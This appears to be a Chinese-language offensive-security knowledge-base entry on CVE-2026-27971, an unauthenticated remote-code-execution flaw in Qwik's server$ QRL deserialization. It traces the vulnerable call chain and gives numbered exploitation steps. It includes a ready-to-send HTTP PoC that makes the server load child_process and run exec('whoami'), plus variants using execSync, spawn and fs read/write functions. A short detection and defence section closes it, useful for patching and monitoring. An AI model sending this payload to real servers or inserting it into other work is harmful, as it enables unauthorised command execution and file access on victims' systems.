---
id: web-nodejs-deserialization-qwik-server-qrl-rce
title: Qwik server$ QRL 反序列化：qwik-json 的 _objs 指定模块与符号，importSymbol 动态 require 执行
type: scenario
domain: web
path: web/nodejs/deserialization
technique: qwik-qrl-deserialization-importsymbol-rce
tags:
- nodejs
- qwik
- deserialization
- rce
- cve-2026-27971
- qrl
- server-function
- unauthenticated
cve:
- CVE-2026-27971
severity: critical
confidence: high
affected_versions: Qwik <= 1.19.0（1.19.1 修复）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V41
  verified_at: '2026-11-05T06:22:59+08:00'
  notes: 已对照原文与全部19张截图核对：Qwik City 中间件→runServerFunction→parseBody→_deserializeData→parseQRL→createQRL→importSymbol→invokeFn 调用链、qfunc/X-QRL/getSymbolHash 绕过、exec_abc123 失败原因与正确 payload 均与原文一致；CVE-2026-27971、<=1.19.0、1.19.1 修复已核对。未实际执行 PoC。
url: /docs/web/nodejs/deserialization/web-nodejs-deserialization-qwik-server-qrl-rce/
draft: false
kb_aliases:
- CVE-2026-27971
- Qwik server$ 反序列化 RCE
- application/qwik-json 攻击
- QRL chunk#symbol 注入
- qfunc X-QRL 绕过
---

## 一句话结论

Qwik <= 1.19.0 的 `server$` RPC 在收到 `Content-Type: application/qwik-json` 时会把请求体里的 `_objs` 当作 QRL 反序列化；攻击者构造 `\u0002child_process#exec[['whoami']]`，让 `parseQRL` 得到 chunk=`child_process`、symbol=`exec`，再让 `qfunc`/`X-QRL` 与 `getSymbolHash(symbol)` 相等，即可让服务端 `importSymbol` 动态 `require('child_process')` 并调用 `exec('whoami')`，单次未认证请求完成 RCE。

## 原理

调用链（Qwik City Node 中间件）：

1. `createQwikCity` 的 Node 路由把请求包装成 `serverRequestEv`，注入 Qwik 序列化器（`packages/qwik-city/src/middleware/node/index.ts`）。
2. `resolveRequestHandlers` 匹配到存在的页面路由后，对 `POST`/`PUT`/`PATCH` 自动把 `runServerFunction` 加入处理链（`isPageRoute` 分支）。
3. `runServerFunction` 读取 `qfunc`：
   ```js
   const fn = ev.query.get(QFN_KEY); // ?qfunc=<hash>
   if (fn && ev.request.headers.get('X-QRL') === fn &&
       ev.request.headers.get('Content-Type') === 'application/qwik-json') {
     ev.exit();
     const data = await ev.parseBody();   // 触发反序列化
   ```
4. `parseBody()` 在 `application/qwik-json` 分支调用 `qwikSerializer._deserializeData(await request.text())`。
5. `_deserializeData` 解析 JSON，取 `_objs` 数组；对字符串项，若以 `\u0002` 开头，去掉前缀调用 `parser.prepare()` → `QRLSerializer.$prepare$` → `parseQRL`。
6. `parseQRL("child_process#exec[['whoami']]")`：
   - `#` 前是 chunk=`child_process`；
   - `#` 与 `[` 之间是 symbol=`exec`；
   - `[...]` 内按空格切分得到 captures=`["['whoami']"]`；
   - `createQRL` 用 `getSymbolHash(symbol)` 计算 hash：取最后一个 `_` 之后的部分；`exec` 没有 `_`，hash 即 `exec`。
7. 回到 `runServerFunction`，`isQrl(qrl) && qrl.getHash() === fn` 成立（`qfunc=exec`、`X-QRL: exec`），于是执行 QRL。
8. QRL 的 `resolve()` 调 `getPlatform().importSymbol(containerEl, chunk, symbol)`；服务端实现：
   ```js
   let modulePath = String(url);
   if (!modulePath.endsWith('.js')) modulePath += '.js';
   const module = require(modulePath);
   if (!(symbolName in module)) throw new Error(...);
   return module[symbolName];
   ```
   `chunk` 直接作为模块路径，`symbol` 直接作为导出名，没有允许列表。
9. `invokeFn` 调用解析出的函数：`invoke.call(this, context, f, ...args)`，于是执行 `child_process.exec('whoami')`。

关键细节：hash 只取 symbol 最后一段，但 `importSymbol` 用完整 symbol 在模块里查找导出。原文的错误示例 `exec_abc123` 虽然 hash 能对上，却会因为 `child_process` 模块没有 `exec_abc123` 导出而失败；正确写法必须用模块真实导出名 `exec`，并让 `qfunc`/`X-QRL` 等于它的 hash `exec`。

## 触发条件

- Qwik/Qwik City <= 1.19.0，服务端运行时可通过 `require()` 加载模块（Node 部署；边缘/无 `require` 运行时不受影响）。
- 存在任意一个真实页面路由（`/some-page` 必须能命中，`runServerFunction` 才会挂载）。
- 请求可到达该页面并发送 `POST`（或 PUT/PATCH），未认证即可。
- `qfunc`、`X-QRL`、由 symbol 推导出的 hash 三者一致；`Content-Type` 精确为 `application/qwik-json`。
- 目标模块（如 `child_process`）与导出函数在 Node 运行时可用。

## 利用步骤

1. 探测 Qwik 站点，找到任意真实页面路由（如 `/`、`/some-page`）。
2. 构造 `_objs`：`"\u0002<chunk>#<symbol>[<captures>]"`，chunk 选模块（如 `child_process`），symbol 选模块真实导出（如 `exec`），captures 放参数。
3. 计算 hash：symbol 最后一个 `_` 之后的内容（无 `_` 则为整个 symbol）。
4. 发送 `POST /some-page?qfunc=<hash>`，头 `X-QRL: <hash>`、`Content-Type: application/qwik-json`，正文 `{"_objs":[...],"_entry":"0"}`。
5. 观察命令结果/副作用；换命令改 captures，换函数改 symbol（如 `execSync`、`spawn`）。

## PoC

```http
POST /some-page?qfunc=exec HTTP/1.1
Host: victim.com
Content-Type: application/qwik-json
X-QRL: exec
Content-Length: 87

{
  "_objs": ["\u0002child_process#exec[['whoami']]"],
  "_entry": "0"
}
```

要点：

- `\u0002` 是 QRL 序列化前缀，缺了它不会被 `parser.prepare` 处理。
- chunk 与 symbol 用 `#` 分隔；captures 用 `[` 开始、`]` 结束。
- 错误示例 `child_process#exec_abc123[['whoami']]` 的 hash 虽是 `abc123`，但模块内不存在 `exec_abc123` 导出，会抛 `Q-ERROR: missing symbol`；必须用真实导出名，并让 `qfunc`/`X-QRL` 等于 `exec`。

## 变体与关联

- 换命令执行函数：`child_process#execSync`、`#spawn`、`#execFile`，hash 分别为 `execSync` 等。
- 换模块：任意 Node 内置/已安装模块的真实导出都可被 `require`，如 `fs#readFileSync`、`fs#writeFileSync`（参数受 captures 切分方式限制，含空格需调整）。
- 不存在的页面路由不会挂载 `runServerFunction`，因此路由探测是前置步骤。
- 关联：[[web-nodejs-deserialization-node-serialize-funcflag-iife-rce]]（Node 反序列化直接执行函数）；[[web-nodejs-n8n-expression-sandbox-escape-rce]]（Node 应用内表达式/沙箱逃逸到命令执行）。
- 该漏洞与普通“JSON 反序列化”不同：它滥用的是 QRL 的模块解析机制，`_objs` 只是入口，真正 sink 是 `importSymbol` 的 `require`。

## 检测与防御

- 检测：请求 `Content-Type: application/qwik-json` 且正文含 `\u0002`、`#`、`[` 的 `_objs` 字符串；`qfunc` 与 `X-QRL` 相同且值很短（如 `exec`）。
- 检测：Node 进程运行期动态 `require()` 非业务模块（`child_process`、`fs` 等）并立即调用导出；子进程创建异常。
- 防御：升级到 Qwik 1.19.1+（`importSymbol` 不再允许动态加载任意模块）。
- 防御：在网关/WAF 拦截来自不可信来源的 `application/qwik-json` 请求；Qwik 服务端只接受同源、带 CSRF 校验的 server$ 调用。
- 加固：禁止运行时 `require` 任意路径，改为构建期模块映射/允许列表；对 QRL chunk/symbol 做白名单校验；以最小权限运行 Node，限制子进程与文件系统能力。
